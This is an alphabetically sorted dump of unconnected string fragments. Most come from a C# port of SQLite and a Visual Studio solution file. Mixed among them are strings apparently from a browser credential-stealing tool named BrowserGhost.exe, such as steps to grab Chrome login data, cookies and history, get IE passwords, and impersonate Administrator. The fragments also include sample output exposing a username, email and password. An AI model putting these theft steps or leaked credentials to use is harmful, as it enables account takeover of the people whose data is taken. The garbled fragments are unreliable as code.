//if( z[i-1]!=' ' ){
//initMaskSet(pMaskSet)
//int (
//int sqlite3PcacheReleaseMemory(int)
//int sqlite3VdbeReleaseMemory(int)
//int sqlite3VtabCommit(sqlite3 db)
//int sqlite3VtabRollback(sqlite3 db)
//int sqlite3_blob_bytes(sqlite3_blob pBlob){
//int sqlite3_blob_close(sqlite3_blob 
//int sqlite3_blob_open(
//int sqlite3_collation_needed16(
//int sqlite3_create_collation16(
//int sz = sqlite3MallocSize(p)
//length = (int)(
//length = (int)(bufpt-buf)
//memcpy(
//memcpy( aData[8 
//memcpy(pTemp
//memset(
//memset( 
//memset(data[hdr
//n = SQLITE_PTR_TO_INT(azResult[0])
//nSize 
//offset = ((c-1)/JOURNAL_HDR_SZ(pPager) 
//opcodeProperty).Length
//p -= 4
//p->iJD = p->iJD/86400 
//p.apArg = (Mem
//p.apCsr = (VdbeCursor
//pBuf 
//pEnd = 
//pIn
//pLeft[1]
//pLevel - pWInfo.a )
//pMem->enc = desiredEnc
//pMem->flags 
//pMem.z = 
//pMem.z =  pMem_z 
//pMem.z = (char
//pMem.zMalloc = pMem.z
//pMem.z[pMem.n
//pMem.z[pMem.n] = '
//pOp > p.aOp )
//pPager.pTmpSpace )
//pStop = 
//public int (
//public sqlite3_pcache 
//public void 
//public void (
//random.Length
//res.azResult = SQLITE_INT_TO_PTR( res.nData )
//res.azResult = azNew
//sEnd.z - pBegin.z
//sizeof(
//sizeof( aSpace ) )
//sizeof( aTempRec ) )
//sizeof(Bitvec 
//sizeof(TableLock) 
//sizeof(azModeName)/sizeof(azModeName[0]) - 1
//sizeof(azType)/sizeof(azType[0]) )
//sizeof(pParse.aAlias[0])
//sqlite3Malloc( (sCheck.nPage
//sqlite3Malloc( nByte )
//sqlite3MallocSize( p )
//sqlite3MallocZero( sizeof(p) )
//sqlite3MallocZero( sizeof(pBt) )
//sqlite3MallocZero( sqlite3.Length )
//sqlite3MallocZero(nBytes)
//sqlite3MallocZero(sizeof(Btree))
//sqlite3ParserAlloc((void
//sqlite3VdbeMemRelease(pMem)
//sqlite3_free )
//sqlite3_free( ref p )
//sqlite3_free( ref wsdAutoext.aExt )
//sqlite3_free(aDyn)
//sqlite3_free(pIdxInfo.idxStr)
//sqlite3_free(pTstAlloc)
//sqlite3_free(ref azResult)
//sqlite3_free(ref p)
//sqlite3_free(ref p.idxStr)
//sqlite3_free(ref p.zErrMsg)
//sqlite3_free(ref pCur.aOverflow)
//sqlite3_free(ref pLock)
//sqlite3_free(ref pzErrMsg)
//sqlite3_free(ref res.zErrMsg)
//sqlite3_free(ref zFullPathname)
//sqlite3_free_table(ref res.azResult[1] )
//sqlite3_free_table(ref res.azResult[1])
//static const YYMINORTYPE yyzerominor = { 0 }
//static int blobReadWrite(
//static u64 floatSwap(u64 in){
//static unsigned char 
//static void currentTimeFunc(
//static void updateVirtualTable(
//struct TableLock {
//typedef struct Incrblob Incrblob
//u8 pOut = 
//unsigned char 
//unsigned int c
//void (
//void pKey = sqlite3Malloc( (int)pCur.nKey )
//void sqlite3BtreeEnter(Btree
//void sqlite3BtreeEnterAll(sqlite3
//void sqlite3BtreeEnterCursor(BtCursor
//void sqlite3BtreeLeave(Btree
//void sqlite3BtreeLeaveAll(sqlite3
//void sqlite3BtreeLeaveCursor(BtCursor
//void sqlite3BtreeMutexArrayEnter(BtreeMutexArray
//void sqlite3BtreeMutexArrayInsert(BtreeMutexArray
//void sqlite3BtreeMutexArrayLeave(BtreeMutexArray
//void sqlite3TableLock(Parse 
//void sqlite3VdbeMutexArrayEnter(Vdbe 
//void sqlite3VtabClear(Table
//void sqlite3VtabLock(VTable 
//void sqlite3VtabUnlock(VTable 
//void sqlite3VtabUnlockList(sqlite3
//while( (pIter
//yyStackEntry pNew
//yytos = yypParser.yystack[yypParser.yyidx]
//z 
//z = sqlite3_malloc( n )
//z = z.Trim( z )
//z = zOut
//zBase).Length
//zBuf[k
//zCsr 
//zDate
//zIn = (u8
//zStmt[k
//zTerm = 
//zWrite 
//z[j
//z[j] = 0
//} else if( v==0 ){
//} while ( nextC != 0 
//}else{
0              /
0 == MEMDB
0 == pPager.memDb 
0' )
0' ) 
0' ) buf[--bufpt] = prefix
0' : zDate[0]
0'. 
000 or 
000 terminated
000 terminated and are not persistent.  The returned string
000 terminated and is persistent.
000 then there is no master journal.  The master
000' or '
0==MEMDB
0]) 
0x003F) 
0x003F)<<10) 
0x0040)<<10)
0x00C0))
0x00FF)
0x00FFFFFF)==(('i'<<16)
0x01)
0x02)
0x03))
0x03C0)
0x03FF) 
0x04)
0x06)
0x08)
0x0F)
0x1F)
0x20))
0x3fff ) == 0 )
0x7f ) == 0 )
0x7f]
0x7fffffff)==n )
0x80 
0x80)!=0 
0x80))
0xFF)
0xFFFFF800)==0xD800                          
0xFFFFFFFE)==0xFFFE ) t = 0xFFFD
0xFFFFFFFE)==0xFFFE ){  c = 0xFFFD
0xff)==SQLITE_ABORT ){
0xff)==rc )
1            The parser accepts its input.
1 (to ensure there is
1 ) == 0 )
1 FROM (
1 FROM tab WHERE x
1 FROM tab WHERE y
1 FROM tab2 WHERE abs(z
1 and 
1 and (N
1 and 2
1 bytes for the
1 bytes of zP4.
1 bytes)
1 pointers to subpages.
1 stores the argc parameter to be passed to the
1 values are popped from the
1!=5
1) )
1) bytes or larger. i.e. that
1)%BITVEC_NINT)
1))!=0 ){
1). If that guess turns
1)==0 )
1-nAux))
10 AS b FROM t1) WHERE a>b
10 FROM (SELECT x
10000000
1039) 
1066.  the SQL standard does not allow '$' in the
1171:  The statement journal might contain page content that is
12!=d OR c==22)
1229.
1644 
1728:  The symbol table might still contain information
1794 
1863.
1863.  To avoid a creating security problems for older
1900
1:      mftbu   %1
1:2))<=len )
1==MEMDB
1==WRITE_LOCK )
1==nOut )
1==uuuuu)
1]       Last observed value of column 1
1] ){
1] = '
1] = 0
1])!=0
1]:           Number of distinct values in column 1
2            No such action.  Denotes unused
2 ...  These terms refer to registers
2 becomes argv[0] when passed to xFilter.
2 in the worst case.
2) FROM tab2
2..P3
20))
2172)
2177 and 
2177.
2189.
2191.
2249)
2252 
2273 
2339)
2454 
2457.
2565.
2565.  See the discussion in the
2673.
2681.
2685.
2699. 
2739:  The _LARGEFILE_SOURCE macro must appear before any
2741.
2880.)
2942)  This used to not matter
2] and Ri is pExpr.x.pList.a[i
3 might be smaller than offset.
3) == 0)
3) operation.  But if
301'
3015 
3015.
306.  Strenghtened by ticket 
31 - 1).
31 . 2147483648
31 pages a minimum fanout of 2 for a
31-1 or 2147483647.
31. Return SQLITE_CORRUPT if a page
32 - to avoid use of LL and warnings in gcc 
32.  So we're safe enough.
3216 
3300 shows that flattening the right term of a LEFT JOIN
3300)
3346.
3382. 
350.
3537 
37 multiplier
3761.
3773.  We could relax this constraint
3810.
3860:  The llvm-gcc-4.2 compiler from Apple chokes on
3879:  that same
3883.
3922)
63. 
7)))!=0
7)==0)
7]=='
7]==' ')
813.
</OutputPath>
</Project>
</PublishUrl>
<configuration>
<database>.
<indexname>  -- 4
<tablename>  -- 3
=  TERM_ORINFO
=  sqlite3GlobalConfig.szScratch
=  the cursor number for table T
= '0'
= ( (Bitmask)1 ) << n
= ( (Bitmask)1 << i )
= ( (u32)0x1f << 28 ) 
= ( (u32)1 ) << iCol
= ( 0x7f << 14 ) 
= ( 1 
= ( 1 << i )
= ( IsHiddenColumn( pTab.aCol[i] ) 
= ( X )
= ( isUpdate 
= ( n - Z ) 
= ( nMaster 
= ( pPgOld.flags 
= ( sqlite3Strlen30( zJournal ) 
= ( zCsr - (u8
= ((
= (0x1f<<28)
= (0x7f<<14)
= (0x7f<<29)
= (1<<(I
= (MEM_Term
= (byte)
= (byte)( 1 << ( I 
= (byte)( 1 << (int)( i 
= (i16)nExtra
= (int)( nMax - pCache.nMax )
= (int)JOURNAL_HDR_SZ( pPager )
= (int)nHeader
= (int)nKey
= (int)pCache.nMin
= (int)pMem.u.nZero
= (int)r
= (long)( ( r - y ) 
= (long)( c1 - localtimeOffset( p ) )
= (long)( p.h 
= (long)( r 
= (sqlite3_int64)( ( r - y ) 
= (u16)( ( pIn1.flags 
= (u16)( ( pVal.flags 
= (u16)( ( xDel == SQLITE_STATIC ) 
= (u16)srcType
= (u32)( ( serial_type1 = aKey1[idx1] ) <= 0x7f 
= (u32)( 1 << iDb )
= (u32)( enc == SQLITE_UTF8 
= (u32)(pIter - pCell)
= (u32)a
= (u32)info.nKey
= (u32)pMem.u.nZero
= (u64)len
= (u8)( autoInc 
= (uint)_pIter
= (ushort)( 
= (ushort)( nStructSize 
= (ushort)staticFlag
= ) sqlite3BtreeCommitPhaseTwo(p.pSrc)
= 0.1
= 0.1 ) { }
= 0x7f
= 0xff
= 0xffffff
= 1 
= 1.0e
= 10
= 10.0
= 12
= 16
= 1e-32
= 1e-8
= 1e8
= 2 )
= 2 ) { }
= 25
= 32
= 35 
= 50
= 9 
= BTREE_NO_READLOCK
= BTREE_OMIT_JOURNAL
= DB_UnresetViews
= EP2_Irreducible
= EP2_MallocedToken
= EP_AnyAff
= EP_DblQuoted
= EP_Distinct
= EP_ExpCollate
= EP_FixedDest
= EP_InfixFunc
= EP_IntValue
= EP_xIsSelect
= FileOptions.RandomAccess
= JOURNAL_CHUNKSIZE
= JT_ERROR
= MEM_Blob
= MEM_Dyn
= MEM_Ephem
= MEM_Int
= MEM_Static
= MEM_Str
= MEM_Str 
= MEM_Term
= MEM_Zero
= N 
= OPFLAG_APPEND
= OPFLAG_USESEEKRESULT
= PGHDR_DIRTY
= PGHDR_DONT_WRITE
= PGHDR_NEED_SYNC
= ROUND8(pVfs->szOsFile))
= ROUND8(pcacheSize))
= ROUND8(sizeof(
= SF_Aggregate
= SF_Expanded
= SF_HasTypeInfo
= SF_Resolved
= SF_UsesEphemeral
= SQLITE_FUNC_EPHEM
= SQLITE_InternChanges
= SQLITE_LegacyFileFmt
= SQLITE_LoadExtension
= SQLITE_OPEN_READWRITE 
= SQLITE_ShortColNames
= SQLITE_WriteSchema 
= TERM_ANDINFO
= TERM_CODED
= TERM_COPIED
= TERM_ORINFO
= TERM_OR_OK
= TF_Ephemeral
= TF_HasPrimaryKey
= TF_Readonly
= TF_Virtual
= UNPACKED_PREFIX_MATCH
= WHERE_BTM_LIMIT
= WHERE_COLUMN_EQ
= WHERE_COLUMN_IN
= WHERE_COLUMN_NULL
= WHERE_COLUMN_RANGE
= WHERE_IDX_ONLY
= WHERE_ORDERBY
= WHERE_ORDERBY 
= WHERE_REVERSE
= WHERE_TOP_LIMIT
= WHERE_UNIQUE
= WO_ALL
= aData[i]
= aKeyword[j].code
= aOp[pc 
= array.Length
= cost 
= elapsed
= enc - 1
= estLog( pCost.rCost )
= extraRight
= i 
= iA
= iLookAhead
= iSpace
= iTo - iFrom
= identLength( p.zName )
= identLength( pCol.zName ) 
= incr
= isExplain
= journalFileSize)
= len
= localtimeOffset( p )
= mask
= n 
= nByte
= nChange
= nColl
= nCopy
= nCursor
= nDestPgsz )
= nHeader )
= nId - 1
= nKey
= nOff
= nOp
= nPathname 
= nPattern-1
= nReg
= nRep
= nRep - nPattern
= nResultCol
= nRow 
= nSrcPagesize
= nStr - i
= nVarint = sqlite3VarintLen( (u64)nHdr )
= nx
= p.mask
= p.tr_tm
= p.u.nZero
= p1
= pCur.info.nHeader
= pExpr.nHeight
= pExpr.x.pList.nExpr 
= pGroupBy.nExpr
= pMem.u.nZero
= pOp.p2
= pPage.nCell
= pPager.pageSize 
= pParse.nVarExprAlloc 
= pParse.sLastToken.n
= pRec.u.nZero
= pTab.nCol
= pTab.nCol 
= pTo.n 
= p[offset 
= p_offset
= precision
= rA
= rounder
= s - p.m 
= sTermCost.nRow
= sTermCost.rCost
= scale
= sizeof( long )
= sqlite3BtreeCommitPhaseTwo( p.pSrc )
= sqlite3MallocSize(PGHDR1_TO_PAGE(p))
= sqlite3PcacheReleaseMemory(n-nRet)
= sqlite3SelectExprHeight( p )
= sqlite3Strlen30( 
= sqlite3Strlen30( p.u.zToken ) 
= sqlite3Strlen30( zFile )
= sqlite3Strlen30(pToCol->a[i].zName) 
= sqlite3Strlen30(zCsr)
= sqlite3VarintLen( serial_type )
= sqlite3VdbeReleaseMemory(n)
= sqlite3VdbeSerialTypeLen( aType[i] )
= sqlite3_value_double( argv[0] )
= strlen(zStmt[k])
= sz
= szCell[d] 
= szCell[i] 
= trigStackEntry.newColMask
= trigStackEntry.oldColMask
= tx.iJD
= useType 
= wsdPrng.s[(u8)wsdPrng.i]
= zMaster[nMaster]
=(P)
=.  The particular operator is
=0.1)
=2){
===============Chrome=============
===============IE=============
A only.  The
AAAA where AAAA is a parameter name. 
ARRAY_INCR)
Administrator
Any CPU
Any CPU = Debug
Any CPU = Release
Any CPU.ActiveCfg = Debug
Any CPU.ActiveCfg = Release
Any CPU.Build.0 = Debug
Any CPU.Build.0 = Release
AppData
AuthContext 
BITOR
BITVEC_SZELEM)
BLOB 
BOOL bExclusive
BOOL bInit = TRUE
BOOL bPending
BOOL bReserved
BOOL bReturn = FALSE
BTREE_LEAFDATA     Used for SQL tables with rowid keys
BenignMallocHooks 
BtCursor p
BtCursor pCsr
BtLock 
BtLock pIter
BtLock pLock
BtLock pLock = 0
BtLock pLock = ppIter
BtShared 
BtShared pBt = p.pBt
BtShared pBt = pBtree.pBt
BtShared pBt = pPage.pBt
BtShared pList
Btree 
Btree p = db.aDb[i].pBt
Btree pExisting = db.aDb[iDb].pBt
Btree pSib
CHECK_PAGE(pPg)
CRITICAL_SECTION mutex
CellInfo info
CharUpperW(zName)
Chrome
CloseHandle(h)
CloseHandle(pFile.hMutex)
CloseHandle(pFile.hShared)
Column pCol = null
Cookies to C:
Credential   : Iloveprettygirls
D-1)/D
DB_SchemaLoaded )
DB_SchemaLoaded)==null ))
DWORD dwErr
DWORD nNumberOfBytesToLockHigh
DWORD nNumberOfBytesToUnlockHigh
DWORD owner
Debug
Debug.Assert(
Debug.Assert(  pPager.state>=PAGER_SHARED 
Debug.Assert( !(p.db.flags
Debug.Assert( !SAVEPOINT_BEGIN 
Debug.Assert( !pBt.pWriter )
Debug.Assert( !pCsr.pBt.readOnly 
Debug.Assert( !pPg.pageHash 
Debug.Assert( ( p.btreeMask 
Debug.Assert( ( pMem.flags 
Debug.Assert( (isTemp 
Debug.Assert( (pMem.flags
Debug.Assert( (pTerm.eOperator
Debug.Assert( 0==(p.db.flags
Debug.Assert( 0==MEMDB 
Debug.Assert( 0==db.mallocFailed )
Debug.Assert( READ_LOCK
Debug.Assert( WO_EQ==SQLITE_INDEX_CONSTRAINT_EQ )
Debug.Assert( WO_GE==SQLITE_INDEX_CONSTRAINT_GE )
Debug.Assert( WO_GT==SQLITE_INDEX_CONSTRAINT_GT )
Debug.Assert( WO_LE==SQLITE_INDEX_CONSTRAINT_LE )
Debug.Assert( WO_LT==SQLITE_INDEX_CONSTRAINT_LT )
Debug.Assert( WO_MATCH==SQLITE_INDEX_CONSTRAINT_MATCH )
Debug.Assert( WRITE_LOCK>READ_LOCK )
Debug.Assert( argc==1 )
Debug.Assert( cursorHoldsMutex(pCsr) )
Debug.Assert( cursorHoldsMutex(pCur) )
Debug.Assert( debugMutexHeld(p) )
Debug.Assert( eLock==READ_LOCK 
Debug.Assert( i < p.nOp - 3 )
Debug.Assert( iAlias > 0 
Debug.Assert( iDb >= 0 )
Debug.Assert( id-2 >= 0 )
Debug.Assert( isOpen(pPager.jfd) 
Debug.Assert( isWriteLock == 0 
Debug.Assert( isWriteLock==null 
Debug.Assert( n > 5 
Debug.Assert( n==pPage.pgno 
Debug.Assert( nArg>1 
Debug.Assert( p->cnt==0 )
Debug.Assert( p->id==SQLITE_MUTEX_FAST 
Debug.Assert( p->id==SQLITE_MUTEX_RECURSIVE 
Debug.Assert( p.db!=null )
Debug.Assert( p.inTrans!=TRANS_NONE )
Debug.Assert( p.inTrans>0 )
Debug.Assert( p.lock.pBtree==p 
Debug.Assert( p.locked==null )
Debug.Assert( p.nRef !=0
Debug.Assert( p.sharable 
Debug.Assert( p.sharable )
Debug.Assert( p.wantToLock==null )
Debug.Assert( p1 >= 0 
Debug.Assert( p==null )
Debug.Assert( p==pBt.pWriter )
Debug.Assert( pBt.isExclusive==null 
Debug.Assert( pBt.isPending==null 
Debug.Assert( pBt.nRef>0 )
Debug.Assert( pC.pVtabCursor==0 )
Debug.Assert( pCsr.apPage[pCsr.iPage].intKey )
Debug.Assert( pCsr.eState!=CURSOR_REQUIRESEEK )
Debug.Assert( pCsr.isIncrblobHandle )
Debug.Assert( pCur.pVtabCursor )
Debug.Assert( pIter.eLock==READ_LOCK 
Debug.Assert( pLock.eLock==READ_LOCK 
Debug.Assert( pLock.iTable!=1 
Debug.Assert( pLock.pBtree.inTrans>=pLock.eLock )
Debug.Assert( pMem.db == null 
Debug.Assert( pMem.db==null 
Debug.Assert( pMem.enc!=0 )
Debug.Assert( pMem.enc!=desiredEnc )
Debug.Assert( pMem.n>=0 )
Debug.Assert( pName.flags 
Debug.Assert( pOffset == null )
Debug.Assert( pOp.p4.pVtab!=0 )
Debug.Assert( pOp.p4type==P4_VTAB )
Debug.Assert( pOp[-1].opcode==OP_Integer )
Debug.Assert( pPage.isInit!=0 )
Debug.Assert( pSrcList !=null 
Debug.Assert( pTab.azModuleArg 
Debug.Assert( pTab.iPKey<0 )
Debug.Assert( pTerm.eOperator 
Debug.Assert( pVdbe != null )
Debug.Assert( pVtab.pModule.xRename )
Debug.Assert( rc==SQLITE_OK 
Debug.Assert( sqlite3BtreeHoldsMutex(p) )
Debug.Assert( sqlite3BtreeHoldsMutex(pBtree) )
Debug.Assert( sqlite3_mutex_held(pBt.mutex) )
Debug.Assert( sqlite3_mutex_held(pCsr.pBtree.db.mutex) )
Debug.Assert( sqlite3_mutex_held(pCtx.s.db.mutex) )
Debug.Assert( sqlite3_mutex_held(pCur.pBtree.db.mutex) )
Debug.Assert( sqlite3_mutex_notheld(pBt.mutex) )
Debug.Assert( v )
Debug.Assert( winMutex_isInit==1 )
Debug.Assert(!pCur.aOverflow)
Debug.Assert(!pCur.aOverflow[iIdx] 
Debug.Assert(!pCur.isIncrblobHandle)
Debug.Assert((pQuery.flags
Debug.Assert(SQLITE_IOCAP_ATOMIC512==(512>>8))
Debug.Assert(SQLITE_IOCAP_ATOMIC64K==(65536>>8))
Debug.Assert(SQLITE_MAX_DEFAULT_PAGE_SIZE<=65536)
Debug.Assert(db.magic == SQLITE_MAGIC_BUSY)
Debug.Assert(false)
Debug.Assert(iType-2 >= 0 )
Debug.Assert(p )
Debug.Assert(p.iSize<=p.nBuf)
Debug.Assert(p.id==SQLITE_MUTEX_FAST 
Debug.Assert(p.id==SQLITE_MUTEX_RECURSIVE 
Debug.Assert(p.nRef==0 
Debug.Assert(p.nRef==0 )
Debug.Assert(p.nRef>0 )
Debug.Assert(p.owner==GetCurrentThreadId() )
Debug.Assert(pCur.pVtabCursor )
Debug.Assert(pModulE.xColumn )
Debug.Assert(pModulE.xNext )
Debug.Assert(pOp.p3>0 
Debug.Assert(pVtab 
Debug.Assert(ppDb )
Debug.Assert(rc==SQLITE_NOMEM 
Debug.Assert(rc==SQLITE_OK    
Debug.Assert(zFilename )
Debugger.Break ()
Default
DeleteCriticalSection(
DeleteCriticalSection(p.mutex)
DeleteFileW(pFile.zDeleteOnClose)==0
Desktop>BrowserGhost.exe
ENC(
EP_ExpCollate ) 
EP_TokenOnly.
EndGlobal
EndGlobalSection
EndProject
EnterCriticalSection(p.mutex)
Expr 
Expr pExpr
Expr pExpr      /
Expr pExpr = pOrderBy.a[i].pExpr
Expr pInClause = null
Expr pNewExpr
Expr pSelectRowid = null
Expr pWhere         /
Expr pWhereRowid = null
Expr sqlite3LimitWhere(
ExprList 
ExprList pEList = 0
ExprList pEList = null
ExprList pList
FILE 
FILE_MAP_READ
FLOAT
FLOAT 
FULL
Favorites
FileTimeToLocalFileTime(
FileTimeToSystemTime(
FuncDef 
FuncDefHash 
GLOBAL(BtShared
GetVersionEx(
Global
GlobalSection(ExtensibilityGlobals) = postSolution
GlobalSection(ProjectConfigurationPlatforms) = postSolution
GlobalSection(SolutionConfigurationPlatforms) = preSolution
GlobalSection(SolutionProperties) = preSolution
Google
HANDLE hMutex
HANDLE hShared
HashElem p
HideSolutionNode = FALSE
History to C:
IE History
INSERT 
INTERSECT 
Identity     : n0thing@gmail.com
Index pIdx
Index pIdx = (Index 
InitializeCriticalSection(
InitializeCriticalSection(p.mutex)
Inputs
Interlocked.Increment(ref  location)
Internet Explorer
JOIN 
JT_RIGHT
JournalFile 
JournalFile p = (JournalFile 
JournalFileMethods
JournalFileMethods ){
LE expr 
LPOVERLAPPED lpOverlapped
LSHIFT
LastModified : 2020/6/17 7:08:50
LeaveCriticalSection(p.mutex)
LinkId=255141
ListAppend() routines.
Local
Login Data to C:
LookasideSlot pBuf
M elements in the array.  The first M pointers point
MEMDB != 0
MEM_Blob )
MEM_Blob ) )
MEM_Blob))==0 
MEM_Dyn
MEM_Dyn )
MEM_Dyn ){
MEM_Dyn)
MEM_Ephem)
MEM_Ephem)!=0 
MEM_Int)!=0 
MEM_Null) )
MEM_RowSet)==0 )
MEM_Static )
MEM_Str )
MEM_Str )!=0)
MEM_Zero)
MEM_Zero))
MINUS expr 
Mem 
Mem m = new Mem()
Mem pDest
MemPage pPage = apPage[i]
MemSetTypeFlag(
Microsoft
MinimumVisualStudioVersion = 10.0.40219.1
Module pMod = (Module 
Monitor.Enter(mtx)
Monitor.Exit(mtx)
N behavior in patternCompare().
N bytes of memory.
N is the N-th register.
N is the N-th register. 
NE expr 
NNN (where NNN is a number) are used
NORMAL
NOTNULL 
NOTREACHED
NO_TEST
NULL pointers replaced by SQL NULL.  %Q 
OP_IdxLT             /
OP_SeekLe            /
OSVERSIONINFO sInfo
Outputs
P1-1 are
P2-1 contain a single row of
P2-1) corresponds to the
P3-1 and P2..P2
P3-1 into registers
P3-1 over into
P3-1 to overlap.
P3-1) (all this
P3-1.
P3-1.  Registers P1..P1
PCache1.szPage byte). The
PDbSize are undefined.  If JOURNAL_HDR_SZ bytes
PGHDR_DIRTY) 
PGHDR_DONT_WRITE
PGHDR_NEED_READ
PGHDR_NEED_SYNC
PGHDR_NEED_SYNC) !=0)
PGHDR_NEED_SYNC)==0)
PTF_LEAF
PTF_LEAF)
Pager 
Pager pPager = pPg.pPager
Pager pPager = sqlite3BtreePager( pDb.pBt )
Parse 
Parse pParse = pNC.pParse
PgHdr 
PgHdr p 
PgHdr1 p
Pgno child = sqlite3Get4byte(z)
Pgno iTab = 0
Pgno n
Pgno ovfl = sqlite3Get4byte(z[info.iOverflow])
REM expr 
RSHIFT expr 
Release
Resource     : https://github.com/
SEPARATOR
SF_Distinct )
SF_UsesEphemeral )
SLASH
SQLITE_CORRUPT
SQLITE_DEFAULT_LOCKING_MODE)
SQLITE_FullColNames
SQLITE_InternChanges
SQLITE_LegacyFileFmt
SQLITE_LoadExtension
SQLITE_OPEN_MAIN_DB ) 
SQLITE_OPEN_MAIN_DB)
SQLITE_OPEN_MAIN_DB)) ==
SQLITE_OPEN_READWRITE 
SQLITE_PTR_TO_INT(pVal->z)) )
SQLITE_PTR_TO_INT(pVal.z))
SQLITE_ReadUncommitted)
SQLITE_ReadUncommitted) 
SQLITE_ReadUncommitted) ){
SQLITE_UTF16BE:SQLITE_UTF16LE)
SQLITE_UTF16_ALIGNED )
SQLITE_UTF16_ALIGNED ) 
SQLITE_UTF16_ALIGNED ) )
SQLITE_UTF16_ALIGNED ) == enc2 )
SQLITE_WSD sqlite3BlockedList = 0
SQLITE_WSD sqlite3SharedCacheList = 0
STRING 
SYSTEMTIME pTm
SaveBuf[nested].apVtabLock = apVtabLock 
SaveBuf[nested].declareVtab = declareVtab
SaveBuf[nested].nVtabLock = nVtabLock   
SaveBuf[nested].sArg = sArg             
Schema 
Schema pSchema = (Schema 
Select pSelect = 0
Select pSelect = null
SelectDest dest
Sign in to GitHub 
Size() routines each return the number of bytes required
Sleep(1)
Sleep(100)
SolutionGuid = {0F15F187-010C-49EB-9407-B24C4035BC38}
SrcList 
SrcList pSelectSrc = null
SrcList pSrcList = pNC.pSrcList
SrcList_item pItem
System.Data.SQLite.dll
System.DateTime dt = new System.DateTime()
TEMP_MASTER_NAME:MASTER_NAME)
TERM_OR_OK )
TOKEN)
TRACE_IDX_INPUTS(p)
TRACE_IDX_OUTPUTS(p)
TRIGGER_AFTER 
TabResult p = (TabResult)pArg
TabResult res = new TabResult()
Table 
Table pTab = null
Table pTab = pIndex.pTable
TableLock p
TableLock p = pParse.aTableLock[i]
Temp
UNPACKED_PREFIX_SEARCH )
UNUSED_PARAMETER(argc)
UNUSED_PARAMETER(argv)
UNUSED_PARAMETER(flags)
UNUSED_PARAMETER(id)
UNUSED_PARAMETER(nFull)
UNUSED_PARAMETER(p)
UPDATE_MAX_BLOBSIZE(pDest)
URL=https://github.com/session
UnmapViewOfFile(pFile.shared)
User Data
Users
VTable 
VTable pVTab
Vault Type   : Web Credentials
Vdbe pVdbe
Vdbe v = pParse.pVdbe
VdbeCursor 
VdbeCursor pCur = p.apCsr[pOp.p1]
VdbeOp pOp
VisualStudioVersion = 16.0.29613.14
WCHAR 
WCHAR.Length
WHERE_IDX_ONLY )
WHERE_INDEXED is true.
WHERE_IN_ABLE 
WHERE_MULTI_OR is true.  And pVtabIdx
WHERE_VIRTUALTABLE is true.  It is never the
WO_EQ
WO_EQ.  The WhereLevel.wsFlags field can then be used as
WO_GE
WO_GT
WO_ISNULL) ) continue
WO_ISNULL.
WO_LE
WO_LT
WO_MATCH) )
Walker.u.pi to 0 if the expression is
WhereClause 
WhereCost 
WhereTerm 
WhereTerm pNewTerm
X is out of range or if the value
X] is not equal to X or if yy_shift_ofst[S]
YYERRORSYMBOL)) >= YYNSTATE
YYMINORTYPE u2
YYNRULE
YYNRULE              A syntax error has occurred.
YYNRULE   Reduce by rule N-YYNSTATE.
[.github.com] 
[.google.com] 
[PASSWORD] -> Iloveprettygirls
[URL] -> https://xui.ptlogin2.qq.com/cgi-bin/xlogin
[USERNAME] -> n0thing@gmail.com
[assembly: ComVisible(false)]
[github.com] 
] = '
] = ' '
] = '('
] = ')'
] = '-'
] = '.'
] = '0'
] = '['
] = ']'
] = (byte)( ( v 
] = (char)( exp % 10 
] = (char)( exp / 10 
] = (char)( exp / 100 
] = 0
] = aDigits[infop.charset]
] = c
] = ch
] = code 
] = handle
] = i
] = iCursor
] = iReg
] = new WhereTerm()
] = p->pUnlockArg
] = p.iReg
] = pBtree
] = pCell[_pCell
] = pExpr
] = pTab
] = pVTab
] = prefix
] = q
] = zIdent[j]
] = zStr[i]
] = z[i]
] Copy C:
] Current user Administrator
] Delete File C:
] Impersonate user Administrator
] Recvtoself
] [4764] [explorer] [Administrator]
] parameters.
] pointer and an integer column number.
].iCol = (u16)i
].pExpr ) 
]Get Chrome Bookmarks
]Get Chrome Cookie
]Get Chrome History
]Get Chrome Login Data
]Get IE Books
]Get IE History
]Get IE Password
]] : 0 )
______/       
_______/ 
________/     
________/       
_____________ subquery __________/          /
_______________/     
________________/
_____________________ outer query ______________________________/
__________________________/
__asm {
__attribute__((aligned(8)))
__cdecl localtime(const time_t 
__declspec(naked) __inline sqlite_u3264 __cdecl sqlite3Hwtime(void){
__inline__ sqlite_u3264 sqlite3Hwtime(void){
_fmt )
_fmt]
_fmt] ) ) != '%' 
_fmt] ) ) != 0 )
_fmt] ) ) == 0 )
a = (int
a = a << 14
a = a << 7
a!=0 
aArg
aArg = aStatic
aArg[nArg
aConstraint
aConstraintUsage
aDyn = 0
aDyn = aArg = pNew
aNew
aNew))
aOp)
aOrderBy
aOvflSpace[apDiv[i]-pParent.aData]
aOvflSpace[iOvflSpace]
aPayload[pCur.info.nLocal] > 
aSortOrder
aSpace1[iSpace1]
aSpace1[pBt.pageSize 
aStatic[16]
aStatic[id-2]
aVTrans
aVTrans = db->aVTrans
aXRef[j] = -1
a] - UpperToLower[
a]==UpperToLower[
abcdefg 
abort_due_to_error:
abort_due_to_interrupt:
abort_due_to_misuse:
abort_parse:
addToBlockedList(db)
aggregate_context)(sqlite3_context
aggregate_count)(sqlite3_context
alarmCallback)(void
allocateIndexInfo(
ap =  sqlite3GlobalConfig.mutex
apArg
apArg = p.apArg
apArg[i] = pArgc[i
apArg[i] = pX
apCell[nMaxCells]
apCopy[nOld - 1].aData[8]
apDiv[i] = 
apVtabLoc = null
apVtabLock
apVtabLock = SaveBuf[nested].apVtabLock
append_from_error:
are to cleanup in case any locks remained open 
argc are the argc
argv)
arithmetic_result_is_null:
assert( !db->mallocFailed )
assert( !p 
assert( !p->locked 
assert( !pLater->locked 
assert( !pMem.xDel )
assert( (p->locked==0 
assert( (z-zBuf)==n )
assert( 0==MEMDB )
assert( aArg==aDyn 
assert( c==i )
assert( c==t )
assert( db==0 
assert( i==0 
assert( iDb>=0 
assert( iType-2 < sizeof(winMutex_staticMutexes)/sizeof(winMutex_staticMutexes[0]) )
assert( id-2 < (int)(sizeof(aStatic)/sizeof(aStatic[0])) )
assert( isOpen(pPager.fd) )
assert( n>0 
assert( nArg<=(int)ArraySize(aStatic) 
assert( p->db==p->pBt->db )
assert( p->locked)
assert( p->locked==0 )
assert( p->locked==1 )
assert( p->pNext==0 
assert( p->pPrev==0 
assert( p->pUnlockConnection 
assert( p->sharable 
assert( p->sharable )
assert( p->sharable==0 
assert( p->wantToLock==1 )
assert( p->wantToLock>0 )
assert( p->xUnlockNotify )
assert( p2->xUnlockNotify==p->xUnlockNotify 
assert( pArray->aBtree[i]!=pBtree )
assert( pArray->nMutex<ArraySize(pArray->aBtree)-1 )
assert( pArray->nMutex>=0 )
